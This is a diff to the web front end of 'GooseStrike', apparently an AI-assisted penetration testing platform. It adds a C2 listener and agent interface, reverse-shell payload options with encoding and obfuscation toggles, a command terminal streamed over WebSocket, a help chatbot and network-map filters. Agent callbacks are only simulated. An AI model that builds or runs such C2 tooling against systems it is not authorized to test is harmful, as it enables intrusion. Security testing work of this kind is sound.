+                            <p class="text-sm mt-2">Interact with an agent to queue tasks</p>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <template x-for="task in c2Tasks" :key="task.id">
+                                <div class="bg-sp-grey border border-sp-grey-mid rounded-lg p-4 hover:border-sp-red/50 transition">
+                                    <div class="flex items-center justify-between mb-2">
+                                        <div class="flex items-center gap-3">
+                                            <span :class="{
+                                                'bg-blue-500 animate-pulse': task.status === 'pending',
+                                                'bg-yellow-500 animate-pulse': task.status === 'running',
+                                                'bg-green-500': task.status === 'completed',
+                                                'bg-sp-red': task.status === 'failed'
+                                            }" class="w-3 h-3 rounded-full"></span>
+                                            <span class="font-mono text-sp-red" x-text="task.agent_hostname"></span>
+                                            <span class="text-sp-white-muted">→</span>
+                                            <span class="font-mono text-sp-white" x-text="task.command"></span>
+                                        </div>
+                                        <span :class="{
+                                            'bg-blue-500/20 text-blue-400': task.status === 'pending',
+                                            'bg-yellow-500/20 text-yellow-400': task.status === 'running',
+                                            'bg-green-500/20 text-green-400': task.status === 'completed',
+                                            'bg-red-500/20 text-red-400': task.status === 'failed'
+                                        }" class="px-2 py-1 rounded text-xs font-semibold" x-text="task.status"></span>
+                                    </div>
+                                    <template x-if="task.output">
+                                        <pre class="bg-sp-black p-3 rounded text-sm overflow-x-auto border border-sp-grey font-mono text-sp-white-dim mt-2 max-h-48" x-text="task.output"></pre>
+                                    </template>
                                 </div>
                             </template>
                         </div>
@@ -810,6 +1305,56 @@
             </div>
         </div>
 
+        <!-- Listener Modal -->
+        <div x-show="showListenerModal" x-transition class="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
+            <div class="bg-sp-dark rounded-lg p-6 w-full max-w-md border border-sp-grey-mid glow-red" @click.away="showListenerModal = false">
+                <h3 class="text-lg font-bold mb-4 text-sp-white">📡 Create Listener</h3>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm text-sp-white-muted mb-1">Listener Name</label>
+                        <input type="text" x-model="newListener.name" placeholder="http-listener-01"
+                               class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 focus:outline-none focus:ring-2 focus:ring-sp-red text-sp-white placeholder-sp-white-muted">
+                    </div>
+                    <div>
+                        <label class="block text-sm text-sp-white-muted mb-1">Type</label>
+                        <select x-model="newListener.type" 
+                                class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                            <option value="http">HTTP</option>
+                            <option value="https">HTTPS</option>
+                            <option value="tcp">Raw TCP</option>
+                            <option value="smb">SMB Pipe</option>
+                            <option value="dns">DNS</option>
+                        </select>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm text-sp-white-muted mb-1">Bind Host</label>
+                            <input type="text" x-model="newListener.host" placeholder="0.0.0.0"
+                                   class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 focus:outline-none focus:ring-2 focus:ring-sp-red text-sp-white font-mono">
+                        </div>
+                        <div>
+                            <label class="block text-sm text-sp-white-muted mb-1">Port</label>
+                            <input type="number" x-model="newListener.port" placeholder="8443"
+                                   class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 focus:outline-none focus:ring-2 focus:ring-sp-red text-sp-white font-mono">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex gap-3 mt-6">
+                    <button @click="showListenerModal = false" 
+                            class="flex-1 bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded transition">
+                        Cancel
+                    </button>
+                    <button @click="createListener()" 
+                            class="flex-1 bg-sp-red hover:bg-sp-red-dark px-4 py-2 rounded font-semibold transition"
+                            :disabled="!newListener.name || !newListener.port">
+                        Create Listener
+                    </button>
+                </div>
+            </div>
+        </div>
+
         <!-- Range Scan Modal -->
         <div x-show="showRangeScanModal" x-transition class="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
             <div class="bg-sp-dark rounded-lg p-6 w-full max-w-md border border-sp-grey-mid glow-red" @click.away="showRangeScanModal = false">
@@ -859,6 +1404,291 @@
                 </div>
             </div>
         </div>
+
+        <!-- Wizard Modal -->
+        <div x-show="showWizardModal" x-transition class="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
+            <div class="bg-sp-dark rounded-lg w-full max-w-2xl border border-sp-grey-mid" @click.away="showWizardModal = false">
+                <div class="p-4 border-b border-sp-grey-mid flex items-center justify-between">
+                    <h3 class="text-lg font-bold text-sp-white" x-text="wizardTitle"></h3>
+                    <button @click="showWizardModal = false" class="text-sp-white-muted hover:text-white text-xl">✕</button>
+                </div>
+                
+                <!-- Progress Bar -->
+                <div class="px-6 pt-4">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-xs text-sp-white-muted">Step <span x-text="wizardStep"></span> of <span x-text="wizardSteps.length"></span></span>
+                        <span class="text-xs text-sp-red" x-text="Math.round((wizardStep / wizardSteps.length) * 100) + '%'"></span>
+                    </div>
+                    <div class="h-2 bg-sp-grey rounded-full overflow-hidden">
+                        <div class="h-full bg-sp-red transition-all duration-300" :style="'width: ' + (wizardStep / wizardSteps.length * 100) + '%'"></div>
+                    </div>
+                </div>
+                
+                <!-- Step Content -->
+                <div class="p-6">
+                    <template x-for="(step, idx) in wizardSteps" :key="idx">
+                        <div x-show="wizardStep === idx + 1" class="space-y-4">
+                            <h4 class="text-lg font-semibold text-sp-white" x-text="step.title"></h4>
+                            <p class="text-sm text-sp-white-muted" x-text="step.description"></p>
+                            
+                            <!-- Dynamic Fields -->
+                            <template x-for="field in step.fields" :key="field.name">
+                                <div class="space-y-1">
+                                    <label class="block text-sm text-sp-white-muted" x-text="field.label"></label>
+                                    <template x-if="field.type === 'text'">
+                                        <input type="text" 
+                                               x-model="wizardData[field.name]" 
+                                               :placeholder="field.placeholder"
+                                               class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                    </template>
+                                    <template x-if="field.type === 'select'">
+                                        <select x-model="wizardData[field.name]"
+                                                class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red">
+                                            <template x-for="opt in field.options" :key="opt.value">
+                                                <option :value="opt.value" x-text="opt.label"></option>
+                                            </template>
+                                        </select>
+                                    </template>
+                                    <template x-if="field.type === 'textarea'">
+                                        <textarea x-model="wizardData[field.name]" 
+                                                  :placeholder="field.placeholder"
+                                                  rows="3"
+                                                  class="w-full bg-sp-grey border border-sp-grey-mid rounded px-4 py-2 text-sp-white focus:outline-none focus:ring-2 focus:ring-sp-red"></textarea>
+                                    </template>
+                                    <p x-show="field.help" class="text-xs text-sp-white-muted" x-text="field.help"></p>
+                                </div>
+                            </template>
+                            
+                            <!-- Step Tips -->
+                            <div x-show="step.tips" class="bg-sp-grey/50 p-3 rounded border border-sp-grey-mid">
+                                <h5 class="text-xs font-semibold text-sp-red mb-2">💡 Tips</h5>
+                                <ul class="text-xs text-sp-white-muted space-y-1">
+                                    <template x-for="tip in step.tips" :key="tip">
+                                        <li x-text="'• ' + tip"></li>
+                                    </template>
+                                </ul>
+                            </div>
+                        </div>
+                    </template>
+                </div>
+                
+                <!-- Navigation -->
+                <div class="p-4 border-t border-sp-grey-mid flex justify-between">
+                    <button @click="wizardStep > 1 ? wizardStep-- : showWizardModal = false" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded transition"
+                            x-text="wizardStep === 1 ? 'Cancel' : '← Back'">
+                    </button>
+                    <button @click="wizardStep < wizardSteps.length ? wizardStep++ : completeWizard()" 
+                            class="bg-sp-red hover:bg-sp-red-dark px-6 py-2 rounded font-semibold transition"
+                            x-text="wizardStep === wizardSteps.length ? '✓ Complete' : 'Next →'">
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Explain Modal -->
+        <div x-show="showExplainModal" x-transition class="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
+            <div class="bg-sp-dark rounded-lg p-6 w-full max-w-lg border border-sp-grey-mid" @click.away="showExplainModal = false">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-lg font-bold text-sp-white flex items-center gap-2">
+                        <span>❓</span> Explanation
+                    </h3>
+                    <button @click="showExplainModal = false" class="text-sp-white-muted hover:text-white text-xl">✕</button>
+                </div>
+                
+                <div x-show="explainLoading" class="text-center py-8">
+                    <div class="typing-indicator flex gap-1 justify-center">
+                        <span class="w-3 h-3 bg-sp-red rounded-full"></span>
+                        <span class="w-3 h-3 bg-sp-red rounded-full"></span>
+                        <span class="w-3 h-3 bg-sp-red rounded-full"></span>
+                    </div>
+                    <p class="text-sp-white-muted mt-2">Analyzing...</p>
+                </div>
+                
+                <div x-show="!explainLoading && explainResult" class="space-y-4">
+                    <div class="bg-sp-grey/50 p-4 rounded">
+                        <h4 class="text-sm font-semibold text-sp-white mb-2" x-text="explainResult.title || 'Explanation'"></h4>
+                        <div class="text-sm text-sp-white-dim" x-html="renderMarkdown(explainResult.description || '')"></div>
+                    </div>
+                    
+                    <template x-if="explainResult.recommendations && explainResult.recommendations.length">
+                        <div>
+                            <h5 class="text-sm font-semibold text-sp-red mb-2">💡 Recommendations</h5>
+                            <ul class="space-y-2">
+                                <template x-for="rec in explainResult.recommendations" :key="rec">
+                                    <li class="flex items-start gap-2 text-sm text-sp-white-muted">
+                                        <span class="text-green-400">✓</span>
+                                        <span x-text="rec"></span>
+                                    </li>
+                                </template>
+                            </ul>
+                        </div>
+                    </template>
+                    
+                    <template x-if="explainResult.warnings && explainResult.warnings.length">
+                        <div class="bg-yellow-500/10 border border-yellow-500/30 rounded p-3">
+                            <h5 class="text-sm font-semibold text-yellow-400 mb-2">⚠️ Warnings</h5>
+                            <ul class="space-y-1">
+                                <template x-for="warn in explainResult.warnings" :key="warn">
+                                    <li class="text-sm text-yellow-200" x-text="warn"></li>
+                                </template>
+                            </ul>
+                        </div>
+                    </template>
+                    
+                    <template x-if="explainResult.example">
+                        <div>
+                            <h5 class="text-sm font-semibold text-sp-white-muted mb-2">📝 Example</h5>
+                            <pre class="bg-sp-black p-3 rounded text-sm font-mono text-green-400 overflow-x-auto" x-text="explainResult.example"></pre>
+                        </div>
+                    </template>
+                </div>
+                
+                <div class="mt-4 flex justify-end">
+                    <button @click="showExplainModal = false" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-4 py-2 rounded transition">
+                        Close
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Help Chat Panel (Slide-out) -->
+        <div x-show="showHelpPanel" 
+             x-transition:enter="transition ease-out duration-300"
+             x-transition:enter-start="translate-x-full"
+             x-transition:enter-end="translate-x-0"
+             x-transition:leave="transition ease-in duration-200"
+             x-transition:leave-start="translate-x-0"
+             x-transition:leave-end="translate-x-full"
+             class="help-panel fixed right-0 top-0 h-full w-96 bg-sp-dark border-l border-sp-grey-mid z-50 flex flex-col shadow-2xl">
+            
+            <!-- Header -->
+            <div class="p-4 border-b border-sp-grey-mid flex items-center justify-between bg-sp-grey/30">
+                <div class="flex items-center gap-2">
+                    <span class="text-2xl">🤖</span>
+                    <div>
+                        <h3 class="font-bold text-sp-white">GooseStrike Help</h3>
+                        <p class="text-xs text-sp-white-muted">AI-Powered Assistance</p>
+                    </div>
+                </div>
+                <button @click="showHelpPanel = false" class="text-sp-white-muted hover:text-white text-xl">✕</button>
+            </div>
+            
+            <!-- Quick Actions -->
+            <div class="p-3 border-b border-sp-grey-mid bg-sp-grey/20">
+                <p class="text-xs text-sp-white-muted mb-2">Quick Help Topics:</p>
+                <div class="flex flex-wrap gap-1">
+                    <button @click="askHelpQuestion('How do I scan a network?')" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded text-xs transition">
+                        Network Scanning
+                    </button>
+                    <button @click="askHelpQuestion('What is the C2 tab for?')" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded text-xs transition">
+                        C2 Framework
+                    </button>
+                    <button @click="askHelpQuestion('How do I generate payloads?')" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded text-xs transition">
+                        Payloads
+                    </button>
+                    <button @click="askHelpQuestion('Explain the mission planning workflow')" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-2 py-1 rounded text-xs transition">
+                        Mission Planning
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Messages -->
+            <div class="flex-1 overflow-y-auto p-4 space-y-4" id="help-messages">
+                <template x-if="helpMessages.length === 0">
+                    <div class="text-center text-sp-white-muted py-8">
+                        <span class="text-4xl mb-4 block">💬</span>
+                        <p class="text-sm">Ask me anything about GooseStrike!</p>
+                        <p class="text-xs mt-1">I can help with scanning, exploitation, C2, and more.</p>
+                    </div>
+                </template>
+                
+                <template x-for="(msg, idx) in helpMessages" :key="idx">
+                    <div :class="msg.role === 'user' ? 'flex justify-end' : 'flex justify-start'">
+                        <div :class="msg.role === 'user' 
+                                    ? 'bg-sp-red text-white rounded-lg rounded-br-none px-4 py-2 max-w-xs' 
+                                    : 'bg-sp-grey text-sp-white rounded-lg rounded-bl-none px-4 py-2 max-w-xs'">
+                            <p class="text-sm" x-html="renderMarkdown(msg.content)"></p>
+                            <span class="text-xs opacity-60" x-text="msg.time"></span>
+                        </div>
+                    </div>
+                </template>
+                
+                <template x-if="helpLoading">
+                    <div class="flex justify-start">
+                        <div class="bg-sp-grey rounded-lg px-4 py-3">
+                            <div class="typing-indicator flex gap-1">
+                                <span class="w-2 h-2 bg-sp-red rounded-full"></span>
+                                <span class="w-2 h-2 bg-sp-red rounded-full"></span>
+                                <span class="w-2 h-2 bg-sp-red rounded-full"></span>
+                            </div>
+                        </div>
+                    </div>
+                </template>
+            </div>
+            
+            <!-- Input -->
+            <div class="p-4 border-t border-sp-grey-mid bg-sp-grey/30">
+                <form @submit.prevent="sendHelpMessage()" class="flex gap-2">
+                    <input type="text" 
+                           x-model="helpInput"
+                           placeholder="Ask a question..."
+                           class="flex-1 bg-sp-grey border border-sp-grey-mid rounded-lg px-4 py-2 text-sm text-sp-white placeholder-sp-white-muted focus:outline-none focus:ring-2 focus:ring-sp-red">
+                    <button type="submit" 
+                            :disabled="!helpInput.trim() || helpLoading"
+                            class="bg-sp-red hover:bg-sp-red-dark disabled:bg-sp-grey disabled:cursor-not-allowed px-4 py-2 rounded-lg transition">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
+                        </svg>
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Onboarding Overlay -->
+        <div x-show="showOnboarding && !localStorage.getItem('goosestrike-onboarded')" 
+             x-transition
+             class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center">
+            <div class="bg-sp-dark rounded-xl p-8 w-full max-w-xl border border-sp-red/30 text-center">
+                <div class="text-6xl mb-4">🦆</div>
+                <h2 class="text-2xl font-bold text-sp-white mb-2">Welcome to GooseStrike!</h2>
+                <p class="text-sp-white-muted mb-6">Your AI-powered penetration testing platform. Let's get you started.</p>
+                
+                <div class="grid grid-cols-3 gap-4 mb-6">
+                    <div class="bg-sp-grey/50 p-4 rounded-lg">
+                        <span class="text-2xl">🎯</span>
+                        <h4 class="font-semibold text-sp-white mt-2">Plan</h4>
+                        <p class="text-xs text-sp-white-muted">Define your targets and objectives</p>
+                    </div>
+                    <div class="bg-sp-grey/50 p-4 rounded-lg">
+                        <span class="text-2xl">🔍</span>
+                        <h4 class="font-semibold text-sp-white mt-2">Scan</h4>
+                        <p class="text-xs text-sp-white-muted">Discover and enumerate</p>
+                    </div>
+                    <div class="bg-sp-grey/50 p-4 rounded-lg">
+                        <span class="text-2xl">⚡</span>
+                        <h4 class="font-semibold text-sp-white mt-2">Strike</h4>
+                        <p class="text-xs text-sp-white-muted">Execute and maintain access</p>
+                    </div>
+                </div>
+                
+                <div class="flex gap-4 justify-center">
+                    <button @click="showOnboarding = false; localStorage.setItem('goosestrike-onboarded', 'true')" 
+                            class="bg-sp-grey hover:bg-sp-grey-light px-6 py-3 rounded-lg transition">
+                        Skip Tour
+                    </button>
+                    <button @click="showOnboarding = false; localStorage.setItem('goosestrike-onboarded', 'true'); startWizard('guided_tour')" 
+                            class="bg-sp-red hover:bg-sp-red-dark px-6 py-3 rounded-lg font-semibold transition">
+                        Start Guided Tour →
+                    </button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -877,6 +1707,8 @@
                 terminalInput: '',
                 terminalHistory: [],
                 terminalLoading: false,
+                terminalWs: null,
+                terminalStreaming: false,
                 commandHistory: [],
                 historyIndex: -1,
                 scans: [],
@@ -891,10 +1723,69 @@
                 networkHosts: [],
                 selectedHost: null,
                 networkMapLoading: false,
+                osFilters: [],  // Active OS type filters for network map
                 networkScanProgress: { current: 0, total: 0, currentIp: '', hostsFound: 0 },
                 showRangeScanModal: false,
                 rangeScanTarget: '',
                 rangeScanType: 'quick',
+
+                // C2 Command & Control State
+                c2ActivePanel: 'listeners',
+                c2Listeners: [],
+                c2Agents: [],
+                c2Tasks: [],
+                selectedAgent: null,
+                showListenerModal: false,
+                showAgentInteract: false,
+                newListener: {
+                    name: '',
+                    type: 'http',
+                    host: '0.0.0.0',
+                    port: 8443,
+                    protocol: 'HTTPS'
+                },
+                payloadOptions: {
+                    type: 'reverse_shell',
+                    listener: '',
+                    lhost: '',
+                    lport: 4444,
+                    os: 'linux',
+                    arch: 'x64',
+                    format: 'raw',
+                    encode: false,
+                    obfuscate: false
+                },
+                generatedPayload: '',
+                agentCommand: '',
+
+                // Voice Control State
+                voiceState: 'idle', // idle, listening, processing, speaking
+                voiceTranscript: '',
+                voiceSupported: 'webkitSpeechRecognition' in window || 'SpeechRecognition' in window,
+                speechRecognition: null,
+
+                // Wizard State
+                showWizardModal: false,
+                wizardType: 'first_time',
+                wizardTitle: 'Getting Started',
+                wizardStep: 1,
+                wizardSteps: [],
+                wizardData: {},
+
+                // Explain Modal State
+                showExplainModal: false,
+                explainLoading: false,
+                explainResult: null,
+                explainContext: {},
+
+                // Help Panel State
+                showHelpPanel: false,
+                helpMessages: [],
+                helpInput: '',
+                helpLoading: false,
+
+                // Onboarding State
+                showOnboarding: !localStorage.getItem('goosestrike-onboarded'),
 
                 phases: [
                     {
@@ -1145,8 +2036,100 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                     this.terminalInput = '';
                     this.terminalHistory.push({ type: 'cmd', content: command });
                     this.terminalLoading = true;
+                    this.terminalStreaming = true;
                     this.scrollToBottom('terminalOutput');
                     
+                    // Use WebSocket for real-time streaming
+                    try {
+                        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+                        const wsUrl = `${wsProtocol}//${window.location.host}/ws/terminal`;
+                        console.log('Connecting to WebSocket:', wsUrl);
+                        
+                        const ws = new WebSocket(wsUrl);
+                        this.terminalWs = ws;
+                        const self = this;
+                        
+                        ws.onopen = function() {
+                            console.log('WebSocket connected, sending command:', command);
+                            const payload = JSON.stringify({ command: command, working_dir: '/workspace' });
+                            console.log('Payload:', payload);
+                            ws.send(payload);
+                        };
+                        
+                        ws.onmessage = function(event) {
+                            console.log('WebSocket message:', event.data);
+                            const data = JSON.parse(event.data);
+                            
+                            if (data.type === 'stdout' && data.data) {
+                                // Append to last stdout or create new one for continuous output
+                                const lastEntry = self.terminalHistory[self.terminalHistory.length - 1];
+                                if (lastEntry && lastEntry.type === 'stdout') {
+                                    lastEntry.content += data.data;
+                                } else {
+                                    self.terminalHistory.push({ type: 'stdout', content: data.data });
+                                }
+                                self.scrollToBottom('terminalOutput');
+                            } else if (data.type === 'stderr' && data.data) {
+                                self.terminalHistory.push({ type: 'stderr', content: data.data });
+                                self.scrollToBottom('terminalOutput');
+                            } else if (data.type === 'keepalive') {
+                                // Update status for long-running scans
+                                const lastEntry = self.terminalHistory[self.terminalHistory.length - 1];
+                                if (lastEntry && lastEntry.type === 'keepalive') {
+                                    lastEntry.content = data.message || `Scan in progress (${data.elapsed}s)...`;
+                                } else {
+                                    self.terminalHistory.push({ type: 'keepalive', content: data.message || 'Scan in progress...' });
+                                }
+                                self.scrollToBottom('terminalOutput');
+                            } else if (data.type === 'complete') {
+                                // Remove keepalive message when complete
+                                const lastEntry = self.terminalHistory[self.terminalHistory.length - 1];
+                                if (lastEntry && lastEntry.type === 'keepalive') {
+                                    self.terminalHistory.pop();
+                                }
+                                if (data.exit_code !== 0) {
+                                    self.terminalHistory.push({ type: 'info', content: `Exit code: ${data.exit_code}` });
+                                }
+                                self.terminalLoading = false;
+                                self.terminalStreaming = false;
+                                ws.close();
+                                self.terminalWs = null;
+                            } else if (data.type === 'error' || data.error) {
+                                self.terminalHistory.push({ type: 'stderr', content: data.message || data.error });
+                                self.terminalLoading = false;
+                                self.terminalStreaming = false;
+                            }
+                        };
+                        
+                        ws.onerror = function(error) {
+                            console.error('WebSocket error:', error);
+                            self.terminalHistory.push({ type: 'stderr', content: '[WebSocket connection failed - using fallback]' });
+                            // Fallback to regular fetch
+                            self.terminalStreaming = false;
+                            self.executeCommandFetch(command);
+                        };
+                        
+                        ws.onclose = function(event) {
+                            console.log('WebSocket closed:', event.code, event.reason);
+                            if (self.terminalStreaming) {
+                                // Connection closed before complete message
+                                if (event.code !== 1000) {
+                                    self.terminalHistory.push({ type: 'info', content: `[Connection closed: ${event.code}]` });
+                                }
+                                self.terminalLoading = false;
+                                self.terminalStreaming = false;
+                            }
+                        };
+                        
+                    } catch (e) {
+                        console.error('WebSocket setup error:', e);
+                        // Fallback to regular fetch
+                        this.executeCommandFetch(command);
+                    }
+                },
+
+                async executeCommandFetch(command) {
+                    // Fallback method using regular HTTP
                     try {
                         const response = await fetch('/api/execute', {
                             method: 'POST',
@@ -1161,7 +2144,18 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                         this.terminalHistory.push({ type: 'stderr', content: 'Failed to execute command: ' + e.message });
                     }
                     this.terminalLoading = false;
+                    this.terminalStreaming = false;
                     this.scrollToBottom('terminalOutput');
+                },
+
+                cancelCommand() {
+                    if (this.terminalWs && this.terminalStreaming) {
+                        this.terminalWs.close();
+                        this.terminalWs = null;
+                        this.terminalStreaming = false;
+                        this.terminalLoading = false;
+                        this.terminalHistory.push({ type: 'info', content: '[Command cancelled]' });
+                    }
                 },
 
                 historyUp() {
@@ -1461,6 +2455,28 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                     return 'text-sp-white';
                 },
 
+                // Get normalized OS category for filtering
+                getOsCategory(osType) {
+                    if (!osType) return 'unknown';
+                    const os = osType.toLowerCase();
+                    if (os.includes('windows')) return 'Windows';
+                    if (os.includes('linux') || os.includes('ubuntu') || os.includes('debian') || os.includes('centos') || os.includes('redhat') || os.includes('fedora')) return 'Linux';
+                    if (os.includes('mac') || os.includes('darwin') || os.includes('apple') || os.includes('ios')) return 'macOS';
+                    if (os.includes('cisco') || os.includes('juniper') || os.includes('router') || os.includes('switch') || os.includes('fortinet')) return 'router';
+                    if (os.includes('server') || os.includes('esxi') || os.includes('vmware')) return 'server';
+                    return 'unknown';
+                },
+
+                toggleOsFilter(osType) {
+                    const index = this.osFilters.indexOf(osType);
+                    if (index === -1) {
+                        this.osFilters.push(osType);
+                    } else {
+                        this.osFilters.splice(index, 1);
+                    }
+                    this.renderNetworkMap();
+                },
+
                 selectHost(host) {
                     this.selectedHost = host;
                     this.highlightHostOnMap(host.ip);
@@ -1573,14 +2589,34 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                     const width = container.clientWidth;
                     const height = container.clientHeight;
                     
+                    // Filter hosts based on active OS filters
+                    let filteredHosts = this.networkHosts;
+                    if (this.osFilters.length > 0) {
+                        filteredHosts = this.networkHosts.filter(host => {
+                            const category = this.getOsCategory(host.os_type);
+                            return this.osFilters.includes(category);
+                        });
+                    }
+                    
+                    if (filteredHosts.length === 0 && this.osFilters.length > 0) {
+                        // Show message if no hosts match filter
+                        svg.append('text')
+                            .attr('x', width / 2)
+                            .attr('y', height / 2)
+                            .attr('text-anchor', 'middle')
+                            .attr('fill', '#666')
+                            .text('No hosts match the selected filters');
+                        return;
+                    }
+                    
                     // Create a gateway node (center)
                     const gatewayIp = this.networkHosts[0]?.ip.split('.').slice(0, 3).join('.') + '.1';
                     const nodes = [
                         { id: 'gateway', ip: gatewayIp, os_type: 'router', hostname: 'Gateway', isGateway: true }
                     ];
                     
-                    // Add host nodes
-                    this.networkHosts.forEach(host => {
+                    // Add host nodes (filtered)
+                    filteredHosts.forEach(host => {
                         nodes.push({ 
                             id: host.ip, 
                             ip: host.ip, 
@@ -1591,17 +2627,29 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                     });
                     
                     // Create links from each host to gateway
-                    const links = this.networkHosts.map(host => ({
+                    const links = filteredHosts.map(host => ({
                         source: 'gateway',
                         target: host.ip
                     }));
                     
-                    // Force simulation
+                    // Force simulation - settles quickly and stops
                     const simulation = d3.forceSimulation(nodes)
                         .force('link', d3.forceLink(links).id(d => d.id).distance(150))
                         .force('charge', d3.forceManyBody().strength(-300))
                         .force('center', d3.forceCenter(width / 2, height / 2))
-                        .force('collision', d3.forceCollide().radius(60));
+                        .force('collision', d3.forceCollide().radius(60))
+                        .alphaDecay(0.05)  // Faster decay = settles quicker
+                        .velocityDecay(0.4);  // More friction = less bouncy
+                    
+                    // Stop simulation after it settles (2 seconds)
+                    setTimeout(() => {
+                        simulation.stop();
+                        // Fix all node positions so they don't move
+                        nodes.forEach(n => {
+                            n.fx = n.x;
+                            n.fy = n.y;
+                        });
+                    }, 2000);
                     
                     // Draw links
                     const link = svg.append('g')
@@ -1619,13 +2667,20 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                         .enter().append('g')
                         .attr('class', 'network-node')
                         .attr('data-ip', d => d.ip)
-                        .style('cursor', 'pointer')
-                        .on('click', (event, d) => {
-                            if (!d.isGateway) {
-                                const host = this.networkHosts.find(h => h.ip === d.ip);
-                                if (host) this.selectHost(host);
-                            }
-                        });
+                        .style('cursor', 'pointer');
+                    
+                    // Handle click separately from drag
+                    let isDragging = false;
+                    node.on('click', (event, d) => {
+                        if (isDragging) {
+                            isDragging = false;
+                            return;
+                        }
+                        if (!d.isGateway) {
+                            const host = this.networkHosts.find(h => h.ip === d.ip);
+                            if (host) this.selectHost(host);
+                        }
+                    });
                     
                     // Node circles
                     node.append('circle')
@@ -1664,22 +2719,697 @@ Select a phase above to begin, or use the quick actions in the sidebar!`
                         node.attr('transform', d => `translate(${d.x},${d.y})`);
                     });
                     
-                    // Drag behavior
+                    // Drag behavior - allows repositioning nodes
                     node.call(d3.drag()
                         .on('start', (event, d) => {
-                            if (!event.active) simulation.alphaTarget(0.3).restart();
+                            isDragging = false;
                             d.fx = d.x;
                             d.fy = d.y;
                         })
                         .on('drag', (event, d) => {
+                            isDragging = true;
                             d.fx = event.x;
                             d.fy = event.y;
+                            // Update position immediately
+                            d.x = event.x;
+                            d.y = event.y;
+                            d3.select(event.sourceEvent.target.parentNode)
+                                .attr('transform', `translate(${d.x},${d.y})`);
+                            // Update connected links
+                            link.filter(l => l.source.id === d.id || l.target.id === d.id)
+                                .attr('x1', l => l.source.x)
+                                .attr('y1', l => l.source.y)
+                                .attr('x2', l => l.target.x)
+                                .attr('y2', l => l.target.y);
                         })
                         .on('end', (event, d) => {
-                            if (!event.active) simulation.alphaTarget(0);
-                            d.fx = null;
-                            d.fy = null;
+                            // Keep node fixed at dropped position
+                            d.fx = d.x;
+                            d.fy = d.y;
                         }));
+                },
+
+                // ============ C2 COMMAND & CONTROL FUNCTIONS ============
+                async createListener() {
+                    if (!this.newListener.name || !this.newListener.port) return;
+                    
+                    const listener = {
+                        id: 'listener-' + Date.now(),
+                        ...this.newListener,
+                        status: 'stopped',
+                        connections: 0,
+                        created_at: new Date().toLocaleString()
+                    };
+                    this.c2Listeners.push(listener);
+                    this.showListenerModal = false;
+                    this.newListener = { name: '', type: 'http', host: '0.0.0.0', port: 8443, protocol: 'HTTPS' };
+                    
+                    this.terminalHistory.push({ type: 'info', content: `[C2] Created listener: ${listener.name} on ${listener.host}:${listener.port}` });
+                },
+
+                async toggleListener(listener) {
+                    listener.status = listener.status === 'running' ? 'stopped' : 'running';
+                    if (listener.status === 'running') {
+                        listener.started_at = new Date().toLocaleString();
+                        this.terminalHistory.push({ type: 'info', content: `[C2] Started listener: ${listener.name}` });
+                        
+                        // Simulate agent callback for demo after 3 seconds
+                        if (this.c2Agents.length === 0) {
+                            setTimeout(() => this.simulateAgentCallback(listener), 3000);
+                        }
+                    } else {
+                        this.terminalHistory.push({ type: 'info', content: `[C2] Stopped listener: ${listener.name}` });
+                    }
+                },
+
+                deleteListener(id) {
+                    const listener = this.c2Listeners.find(l => l.id === id);
+                    if (listener) {
+                        this.c2Listeners = this.c2Listeners.filter(l => l.id !== id);
+                        this.terminalHistory.push({ type: 'info', content: `[C2] Deleted listener: ${listener.name}` });
+                    }
+                },
+
+                simulateAgentCallback(listener) {
+                    if (listener.status !== 'running') return;
+                    
+                    const agent = {
+                        id: 'agent-' + Date.now(),
+                        hostname: ['WORKSTATION-01', 'DC01', 'FILESERVER', 'WEB-PROD'][Math.floor(Math.random() * 4)],
+                        username: ['Administrator', 'SYSTEM', 'john.doe', 'svc_account'][Math.floor(Math.random() * 4)],
+                        ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                        os: listener.type === 'http' ? 'Windows Server 2019' : 'Ubuntu 22.04',
+                        arch: 'x64',
+                        pid: Math.floor(Math.random() * 65535),
